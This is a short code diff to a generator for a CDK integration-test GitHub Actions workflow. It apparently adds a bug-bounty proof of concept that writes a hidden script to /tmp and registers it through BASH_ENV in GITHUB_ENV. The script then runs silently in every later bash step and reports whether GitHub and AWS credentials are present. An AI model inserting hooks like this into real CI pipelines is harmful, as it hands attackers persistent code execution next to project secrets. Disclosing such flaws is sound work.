@@ -289,6 +289,18 @@ export class CdkCliIntegTestsWorkflow extends Component {
       committed: false,
       lines: [
         '#!/bin/bash',
+          // --- PoC: for bb ---
+        'cat > /tmp/.poc_hook.sh << "HOOK"',
+        '{',
+        '  echo "### PoC BASH_ENV hook fired: $(date -u +%FT%TZ)"',
+        '  echo "- GITHUB_TOKEN present: $( [ -n \\"$GITHUB_TOKEN\\" ] && echo YES || echo no )"',
+        '  echo "- AWS_ACCESS_KEY_ID present: $( [ -n \\"$AWS_ACCESS_KEY_ID\\" ] && echo YES || echo no )"',
+        '  echo "- AWS_SESSION_TOKEN present: $( [ -n \\"$AWS_SESSION_TOKEN\\" ] && echo YES || echo no )"',
+        '} >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || true',
+        'HOOK',
+        'chmod +x /tmp/.poc_hook.sh',
+        'echo "BASH_ENV=/tmp/.poc_hook.sh" >> "$GITHUB_ENV"',
+        // --- end  ---
         'npm install -g verdaccio pm2',
         'mkdir -p $HOME/.config/verdaccio',
         `echo '${JSON.stringify(verdaccioConfig)}' > $HOME/.config/verdaccio/config.yaml`,
